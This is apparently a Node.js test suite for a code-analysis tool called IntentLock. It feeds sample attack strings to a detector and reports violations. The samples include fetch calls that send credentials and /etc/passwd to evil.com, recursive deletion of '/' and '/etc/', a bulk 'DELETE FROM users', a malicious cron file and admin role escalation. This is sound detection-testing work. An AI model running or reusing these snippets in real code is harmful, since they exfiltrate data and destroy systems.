#!/usr/bin/env node

/**
 * IntentLock Full Pipeline Test Suite
 * 
 * Tests the complete flow with dangerous code examples:
 * 1. analyzer-improved.js detects dangerous operations
 * 2. driftDetector-improved.js detects violations
 * 3. Shows complete pipeline output
 */

const { analyzeBehavior } = require('../analyzer/analyzer-improved');
const { detectDrift } = require('../analyzer/driftDetector-improved');

console.log('\n\n');
console.log('╔════════════════════════════════════════════════════════════════╗');
console.log('║     INTENTLOCK - FULL PIPELINE TEST SUITE                      ║');
console.log('║     Testing with Real Dangerous Code Examples                  ║');
console.log('╚════════════════════════════════════════════════════════════════╝');

// ====================================================================
// STRICT SECURITY CONTRACT
// ====================================================================
const strictContract = {
  allowed_routes: ['/api/users', '/api/auth'],
  allowed_methods: ['GET', 'POST'],
  allowed_dependencies: ['express', 'dotenv'],
  forbidden_actions: [
    'outbound_network_calls',
    'file_system_access',
    'child_process_execution',
    'hardcoded_secrets'
  ],
  intent_constraints: {
    allow_bulk_operations: false,
    allow_recursive_delete: false,
    allow_shell_execution: false,
    allow_external_network_calls: false,
    allow_privilege_escalation: false,
    allow_admin_assignment: false,
    max_risk_level: 'MEDIUM'
  },
  allowed_domains: ['api.example.com'],
  allowed_tables: ['users', 'logs'],
  allowed_paths: ['/tmp', '/var/tmp'],
  allowed_roles: ['user', 'moderator']
};

// ====================================================================
// TEST 1: NETWORK EXFILTRATION
// ====================================================================
console.log('\n\n');
console.log('═'.repeat(70));
console.log('TEST 1: NETWORK EXFILTRATION ATTEMPT');
console.log('═'.repeat(70));

const test1Code = `
const fetch = require('fetch');
const userData = { username: 'admin', password: 'secret123' };
fetch('https://evil.com/steal-data', {
  method: 'POST',
  body: JSON.stringify(userData)
});
`;

console.log('\n📝 Code:');
console.log(test1Code);

const test1Behavior = analyzeBehavior(test1Code);
const test1Result = detectDrift(strictContract, test1Behavior);

console.log('\n🎯 Result:');
console.log(`   Safe: ${test1Result.safe}`);
console.log(`   Violations: ${test1Result.violations.length}`);
if (test1Result.violations.length > 0) {
  console.log(`   Critical Issues:`);
  test1Result.violations.filter(v => v.severity === 'CRITICAL').slice(0, 3).forEach(v => {
    console.log(`     - ${v.detail}`);
  });
}

// ====================================================================
// TEST 2: RECURSIVE FILESYSTEM DELETION
// ====================================================================
console.log('\n\n');
console.log('═'.repeat(70));
console.log('TEST 2: RECURSIVE FILESYSTEM DELETION');
console.log('═'.repeat(70));

const test2Code = `
const fs = require('fs');
fs.rm('/', { recursive: true }, (err) => {
  if (err) console.error(err);
});
`;

console.log('\n📝 Code:');
console.log(test2Code);

const test2Behavior = analyzeBehavior(test2Code);
const test2Result = detectDrift(strictContract, test2Behavior);

console.log('\n🎯 Result:');
console.log(`   Safe: ${test2Result.safe}`);
console.log(`   Violations: ${test2Result.violations.length}`);
if (test2Result.violations.length > 0) {
  console.log(`   Critical Issues:`);
  test2Result.violations.filter(v => v.severity === 'CRITICAL').slice(0, 3).forEach(v => {
    console.log(`     - ${v.detail}`);
  });
}

// ====================================================================
// TEST 3: SHELL COMMAND INJECTION
// ====================================================================
console.log('\n\n');
console.log('═'.repeat(70));
console.log('TEST 3: DESTRUCTIVE SHELL COMMAND EXECUTION');
console.log('═'.repeat(70));

const test3Code = `
const { exec } = require('child_process');
const command = 'rm -rf /etc/';
exec(command, (error, stdout, stderr) => {
  if (error) {
    console.error(\`exec error: \${error}\`);
  }
});
`;

console.log('\n📝 Code:');
console.log(test3Code);

const test3Behavior = analyzeBehavior(test3Code);
const test3Result = detectDrift(strictContract, test3Behavior);

console.log('\n🎯 Result:');
console.log(`   Safe: ${test3Result.safe}`);
console.log(`   Violations: ${test3Result.violations.length}`);
if (test3Result.violations.length > 0) {
  console.log(`   Critical Issues:`);
  test3Result.violations.filter(v => v.severity === 'CRITICAL').slice(0, 3).forEach(v => {
    console.log(`     - ${v.detail}`);
  });
}

// ====================================================================
// TEST 4: BULK DATABASE DELETION
// ====================================================================
console.log('\n\n');
console.log('═'.repeat(70));
console.log('TEST 4: BULK DATABASE DELETION WITHOUT CONSTRAINTS');
console.log('═'.repeat(70));

const test4Code = `
const db = require('database');
const result = db.query('DELETE FROM users;');
console.log('All users deleted:', result);
`;

console.log('\n📝 Code:');
console.log(test4Code);

const test4Behavior = analyzeBehavior(test4Code);
const test4Result = detectDrift(strictContract, test4Behavior);

console.log('\n🎯 Result:');
console.log(`   Safe: ${test4Result.safe}`);
console.log(`   Violations: ${test4Result.violations.length}`);
if (test4Result.violations.length > 0) {
  console.log(`   Critical Issues:`);
  test4Result.violations.filter(v => v.severity === 'CRITICAL').slice(0, 3).forEach(v => {
    console.log(`     - ${v.detail}`);
  });
}

// ====================================================================
// TEST 5: PRIVILEGE ESCALATION
// ====================================================================
console.log('\n\n');
console.log('═'.repeat(70));
console.log('TEST 5: PRIVILEGE ESCALATION ATTACK');
console.log('═'.repeat(70));

const test5Code = `
const user = getCurrentUser();
if (user.id === 123) {
  user.role = 'admin';
  saveUser(user);
}
`;

console.log('\n📝 Code:');
console.log(test5Code);

const test5Behavior = analyzeBehavior(test5Code);
const test5Result = detectDrift(strictContract, test5Behavior);

console.log('\n🎯 Result:');
console.log(`   Safe: ${test5Result.safe}`);
console.log(`   Violations: ${test5Result.violations.length}`);
if (test5Result.violations.length > 0) {
  console.log(`   Critical Issues:`);
  test5Result.violations.filter(v => v.severity === 'CRITICAL').slice(0, 3).forEach(v => {
    console.log(`     - ${v.detail}`);
  });
}

// ====================================================================
// TEST 6: COMBINED ATTACK (Multiple vectors)
// ====================================================================
console.log('\n\n');
console.log('═'.repeat(70));
console.log('TEST 6: COMBINED ATTACK (Multi-vector)');
console.log('═'.repeat(70));

const test6Code = `
const fs = require('fs');
const { exec } = require('child_process');
const fetch = require('fetch');

// 1. Write malicious config
fs.writeFileSync('/etc/cron.d/malware', 'evil script');

// 2. Make it executable
exec('chmod +x /etc/cron.d/malware');

// 3. Exfiltrate data
const data = fs.readFileSync('/etc/passwd', 'utf-8');
fetch('https://evil.com/exfil', { method: 'POST', body: data });

// 4. Escalate privileges
const admin = true;
const user = { role: 'admin', admin: admin };
`;

console.log('\n📝 Code:');
console.log(test6Code);

const test6Behavior = analyzeBehavior(test6Code);
const test6Result = detectDrift(strictContract, test6Behavior);

console.log('\n🎯 Result:');
console.log(`   Safe: ${test6Result.safe}`);
console.log(`   Violations: ${test6Result.violations.length}`);
console.log(`   Critical Issues:`);
test6Result.violations.filter(v => v.severity === 'CRITICAL').slice(0, 5).forEach(v => {
  console.log(`     - ${v.detail}`);
});

// ====================================================================
// TEST 7: SAFE CODE (Should pass)
// ====================================================================
console.log('\n\n');
console.log('═'.repeat(70));
console.log('TEST 7: SAFE CODE (Should have NO violations)');
console.log('═'.repeat(70));

const test7Code = `
const express = require('express');
const app = express();

app.get('/api/users', (req, res) => {
  const users = [
    { id: 1, name: 'Alice' },
    { id: 2, name: 'Bob' }
  ];
  res.json(users);
});

app.post('/api/auth', (req, res) => {
  const { username, password } = req.body;
  if (username && password) {
    res.json({ token: 'valid' });
  }
});

app.listen(3000);
`;

console.log('\n📝 Code:');
console.log(test7Code);

const test7Behavior = analyzeBehavior(test7Code);
const test7Result = detectDrift(strictContract, test7Behavior);

console.log('\n🎯 Result:');
console.log(`   Safe: ${test7Result.safe}`);
console.log(`   Violations: ${test7Result.violations.length}`);
console.log(`   Status: ${test7Result.safe ? '✅ PASSED - Code is safe' : '❌ FAILED - Code has violations'}`);

// ====================================================================
// FINAL SUMMARY
// ====================================================================
console.log('\n\n');
console.log('═'.repeat(70));
console.log('📊 FINAL TEST SUMMARY');
console.log('═'.repeat(70));

const allResults = [
  { name: 'Network Exfiltration', result: test1Result, shouldBeUnsafe: true },
  { name: 'Recursive Deletion', result: test2Result, shouldBeUnsafe: true },
  { name: 'Shell Injection', result: test3Result, shouldBeUnsafe: true },
  { name: 'Bulk DB Delete', result: test4Result, shouldBeUnsafe: true },
  { name: 'Privilege Escalation', result: test5Result, shouldBeUnsafe: true },
  { name: 'Combined Attack', result: test6Result, shouldBeUnsafe: true },
  { name: 'Safe Code', result: test7Result, shouldBeUnsafe: false }
];

console.log('\nTest Results:');
allResults.forEach((test, idx) => {
  const actuallyUnsafe = !test.result.safe;
  const expectedResult = test.shouldBeUnsafe ? 'UNSAFE' : 'SAFE';
  const actualResult = actuallyUnsafe ? 'UNSAFE' : 'SAFE';
  const passed = (test.shouldBeUnsafe === !test.result.safe);
  const status = passed ? '✅ PASS' : '❌ FAIL';
  console.log(`${idx + 1}. ${test.name.padEnd(25)} ${status.padEnd(8)} ${actualResult.padEnd(8)} (${test.result.violations.length} violations)`);
});

const totalViolations = allResults.reduce((sum, t) => sum + t.result.violations.length, 0);
const blockedTests = allResults.filter(t => !t.result.safe).length;

console.log(`\n🎯 Summary:`);
console.log(`   Total Tests:    ${allResults.length}`);
console.log(`   Attacks Blocked: ${blockedTests}/6`);
console.log(`   Total Violations: ${totalViolations}`);
console.log(`\n${blockedTests === 6 ? '✅ ALL DANGEROUS CODE DETECTED AND BLOCKED' : '⚠️  SOME CODE NOT DETECTED'}`);

console.log('\n' + '═'.repeat(70) + '\n');
